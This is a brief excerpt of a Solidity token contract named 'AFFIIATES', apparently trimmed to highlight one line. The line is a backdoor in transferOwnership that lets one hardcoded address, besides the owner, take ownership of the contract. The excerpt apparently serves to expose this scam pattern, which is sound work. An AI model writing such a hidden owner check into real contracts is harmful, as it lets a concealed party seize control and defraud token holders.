...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x70d6702bd04c63CF21B910fF610AC9680A6eA335));
...
contract AFFIIATES is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "AFF";
  string private _name = "AFFIIATES";
